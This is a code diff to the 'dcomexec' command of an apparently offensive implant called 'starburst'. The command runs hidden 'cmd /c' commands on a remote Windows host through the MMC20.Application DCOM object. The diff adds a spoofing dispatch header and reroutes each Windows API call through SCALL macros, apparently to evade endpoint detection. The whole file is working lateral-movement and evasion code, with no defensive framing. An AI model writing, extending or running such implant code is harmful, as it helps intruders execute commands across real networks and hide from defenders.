@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_DCOMEXEC
 
@@ -57,8 +58,8 @@ auto declfn starburst::cmd_dcomexec(
 
     STK_OLE32(_n1);
     STK_OLEAUT32(_n2);
-    HMODULE h_ole32 = inst.kernel32.LoadLibraryA( _n1 );
-    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA( _n2 );
+    HMODULE h_ole32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n1 );
+    HMODULE h_oleaut32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n2 );
 
     if ( !h_ole32 || !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -91,14 +92,14 @@ auto declfn starburst::cmd_dcomexec(
         return;
     }
 
-    HRESULT hr = pCoInitializeEx( nullptr, 0 );
+    HRESULT hr = (HRESULT)SCALL_PTR( inst, pCoInitializeEx, nullptr, 0 );
 
     if ( pCoInitializeSecurity ) {
-        pCoInitializeSecurity( nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
+        SCALL_PTR( inst, pCoInitializeSecurity, nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
     }
 
     wchar_t w_host[256] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_str, host_len, w_host, 255 );
 
     COSERVERINFO si = {};
     si.pwszName = w_host;
@@ -106,9 +107,9 @@ auto declfn starburst::cmd_dcomexec(
     MULTI_QI mqi = {};
     mqi.pIID = &LOCAL_IID_IDispatch;
 
-    hr = pCoCreateInstanceEx( CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
+    hr = (HRESULT)SCALL_PTR( inst, pCoCreateInstanceEx, CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
     if ( FAILED( hr ) || FAILED( mqi.hr ) || !mqi.pItf ) {
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) ) );
         return;
@@ -122,7 +123,7 @@ auto declfn starburst::cmd_dcomexec(
     hr = pApp->lpVtbl->GetIDsOfNames( pApp, LOCAL_IID_NULL, doc_names, 1, LOCALE_SYSTEM_DEFAULT, &doc_dispid );
     if ( FAILED( hr ) ) {
         pApp->lpVtbl->Release( pApp );
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames Document failed" ) ) );
         return;
@@ -135,7 +136,7 @@ auto declfn starburst::cmd_dcomexec(
         DISPATCH_PROPERTYGET, &dp_empty, &vt_doc, nullptr, nullptr );
     if ( FAILED( hr ) || vt_doc.vt != VT_DISPATCH || !vt_doc.pdispVal ) {
         pApp->lpVtbl->Release( pApp );
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "Invoke Document failed" ) ) );
         return;
@@ -150,7 +151,7 @@ auto declfn starburst::cmd_dcomexec(
     if ( FAILED( hr ) ) {
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames ActiveView failed" ) ) );
         return;
@@ -163,7 +164,7 @@ auto declfn starburst::cmd_dcomexec(
     if ( FAILED( hr ) || vt_view.vt != VT_DISPATCH || !vt_view.pdispVal ) {
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "Invoke ActiveView failed" ) ) );
         return;
@@ -179,7 +180,7 @@ auto declfn starburst::cmd_dcomexec(
         pView->lpVtbl->Release( pView );
         pDoc->lpVtbl->Release( pDoc );
         pApp->lpVtbl->Release( pApp );
-        pCoUninitialize();
+        SCALL_PTR( inst, pCoUninitialize );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIDsOfNames ExecuteShellCommand failed" ) ) );
         return;
@@ -192,13 +193,13 @@ auto declfn starburst::cmd_dcomexec(
     wchar_t w_hidden[] = { '7', 0 };
 
     wchar_t w_params[2048] = { '/','c',' ', 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_params + 3, 2044 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, command_str, command_len, w_params + 3, 2044 );
 
     VARIANT args[4];
-    args[3].vt = VT_BSTR; args[3].bstrVal = pSysAllocString( w_cmd );       // Command
-    args[2].vt = VT_BSTR; args[2].bstrVal = pSysAllocString( w_empty );     // Directory
-    args[1].vt = VT_BSTR; args[1].bstrVal = pSysAllocString( w_params );    // Parameters
-    args[0].vt = VT_BSTR; args[0].bstrVal = pSysAllocString( w_hidden );    // WindowState = hidden
+    args[3].vt = VT_BSTR; args[3].bstrVal = (BSTR)SCALL_PTR( inst, pSysAllocString, w_cmd );       // Command
+    args[2].vt = VT_BSTR; args[2].bstrVal = (BSTR)SCALL_PTR( inst, pSysAllocString, w_empty );     // Directory
+    args[1].vt = VT_BSTR; args[1].bstrVal = (BSTR)SCALL_PTR( inst, pSysAllocString, w_params );    // Parameters
+    args[0].vt = VT_BSTR; args[0].bstrVal = (BSTR)SCALL_PTR( inst, pSysAllocString, w_hidden );    // WindowState = hidden
 
     DISPPARAMS dp = { args, nullptr, 4, 0 };
     VARIANT vt_result;
@@ -207,12 +208,12 @@ auto declfn starburst::cmd_dcomexec(
     hr = pView->lpVtbl->Invoke( pView, esc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
         DISPATCH_METHOD, &dp, &vt_result, nullptr, nullptr );
 
-    for ( int i = 0; i < 4; i++ ) pSysFreeString( args[i].bstrVal );
+    for ( int i = 0; i < 4; i++ ) SCALL_PTR( inst, pSysFreeString, args[i].bstrVal );
 
     pView->lpVtbl->Release( pView );
     pDoc->lpVtbl->Release( pDoc );
     pApp->lpVtbl->Release( pApp );
-    pCoUninitialize();
+    SCALL_PTR( inst, pCoUninitialize );
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
